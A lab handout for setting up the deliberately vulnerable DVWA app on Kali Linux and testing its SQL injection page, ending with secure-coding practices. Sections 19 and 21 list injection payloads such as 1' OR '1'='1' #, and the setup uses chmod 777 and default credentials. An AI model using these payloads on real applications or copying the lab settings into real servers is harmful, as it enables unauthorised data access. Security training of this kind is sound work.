# Lab 4 — SQL Injection using DVWA

## 1. Start Kali Linux

```text
Open Oracle VirtualBox
→ Select Kali Linux
→ Start
→ Login
```

## 2. Open Terminal

```bash
```

## 3. Update System

```bash
sudo apt update
```

## 4. Install and Start Apache

Check Apache:

```bash
apache2 -v
```

If not installed:

```bash
sudo apt install apache2 -y
```

Start Apache:

```bash
sudo systemctl start apache2
```

Enable Apache:

```bash
sudo systemctl enable apache2
```

Check status:

```bash
sudo systemctl status apache2
```

Expected:

```text
Active: active (running)
```

## 5. Install and Start MariaDB

```bash
sudo apt install mariadb-server -y
```

Start MariaDB:

```bash
sudo systemctl start mariadb
```

Enable MariaDB:

```bash
sudo systemctl enable mariadb
```

Check status:

```bash
sudo systemctl status mariadb
```

Expected:

```text
Active: active (running)
```

## 6. Install PHP

```bash
sudo apt install php php-mysql libapache2-mod-php -y
```

Check PHP:

```bash
php --version
```

## 7. Install Git

```bash
sudo apt install git -y
```

## 8. Download DVWA

Go to Apache web directory:

```bash
cd /var/www/html
```

Remove default page:

```bash
sudo rm -f index.html
```

Clone DVWA:

```bash
sudo git clone https://github.com/digininja/DVWA.git
```

## 9. Configure DVWA

```bash
cd /var/www/html/DVWA/config
```

Copy configuration:

```bash
sudo cp config.inc.php.dist config.inc.php
```

## 10. Create Database

Open MariaDB:

```bash
sudo mysql
```

Create database:

```sql
CREATE DATABASE dvwa;
```

Create user:

```sql
CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'p@ssw0rd';
```

Grant privileges:

```sql
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
```

Reload privileges:

```sql
FLUSH PRIVILEGES;
```

Exit:

```sql
EXIT;
```

## 11. Configure DVWA Database

Open configuration:

```bash
sudo nano /var/www/html/DVWA/config/config.inc.php
```

Set:

```php
$_DVWA['db_server'] = '127.0.0.1';
$_DVWA['db_database'] = 'dvwa';
$_DVWA['db_user'] = 'dvwa';
$_DVWA['db_password'] = 'p@ssw0rd';
```

Save:

```text
Ctrl+O
Enter
Ctrl+X
```

## 12. Set Permissions

```bash
sudo chmod -R 777 /var/www/html/DVWA/hackable/uploads
```

```bash
sudo chmod -R 777 /var/www/html/DVWA/config
```

## 13. Restart Apache

```bash
sudo systemctl restart apache2
```

## 14. Open DVWA

Open Firefox and visit:

```text
http://localhost/DVWA
```

On the DVWA setup page:

```text
Create / Reset Database
```

After the database is created, log in.

## 15. Login

```text
Username: admin
Password: password
```

Click:

```text
Login
```

## 16. Set Security Level

Navigate to:

```text
DVWA Security
```

Select:

```text
Low
```

Click:

```text
Submit
```

## 17. Open SQL Injection

Navigate to:

```text
SQL Injection
```

## 18. Test Normal Input

Enter:

```text
1
```

Click:

```text
Submit
```

## 19. Test SQL Injection

Enter:

```text
'
```

Click:

```text
Submit
```

## 20. Observe Results

Record:

```text
Returned user information
SQL error messages
Unexpected behavior
Differences between valid and invalid input
```

## 21. SQL Injection Test Inputs

Use the following inputs to observe how the application handles different SQL conditions:

```text
1
```

```text
'
```

```text
1' OR '1'='1
```

```text
1' OR '1'='1' #
```

## 22. Secure Coding Practices

```text
Prepared / Parameterized Statements
Input Validation
Least-Privilege Database Accounts
Hide Detailed Database Errors
Regular Security Testing
```

## 23. Stop Apache and MariaDB

```bash
sudo systemctl stop apache2
```

```bash
sudo systemctl stop mariadb
```

## 24. Verify Services

```bash
sudo systemctl status apache2
```

```bash
sudo systemctl status mariadb
```